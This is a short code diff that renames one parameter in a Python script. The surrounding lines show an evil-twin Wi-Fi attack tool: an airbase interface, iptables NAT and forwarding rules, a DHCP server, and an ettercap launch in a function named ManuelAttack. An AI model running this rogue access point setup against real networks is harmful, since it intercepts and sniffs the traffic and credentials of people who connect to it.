@@ -192,7 +192,7 @@ def StartEttercap():
 	os.system("ettercap -p -u -T -q -i at0")
 
  
-def SetIpRules(Gateway, InterfaceInternet):
+def SetIpRules(Gateway, InternetInterface):
 	print yellow + "[*]"  + white + "Routing Rules"
 	time.sleep(5)
 	os.system("ifconfig at0 192.168.1.1 netmask 255.255.255.0")
@@ -202,7 +202,7 @@ def SetIpRules(Gateway, InterfaceInternet):
 	os.system("iptables -t nat -A PREROUTING -p udp -j DNAT --to %s" % Gateway)
 	os.system("iptables -P FORWARD ACCEPT")
 	os.system("iptables --append FORWARD --in-interface at0 -j ACCEPT")
-	os.system("iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE" % InterfaceInternet)
+	os.system("iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE" % InternetInterface)
 	os.system("dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0")
 	os.system("/etc/init.d/isc-dhcp-server start")
 	
@@ -231,7 +231,7 @@ def ManuelAttack():
 	#Execute
 	os.system(CommandAirBase)
 
-	SetIpRules(Gateway, InterfaceInternet)
+	SetIpRules(Gateway, InternetInterface)
 	StartEttercap()
 
 
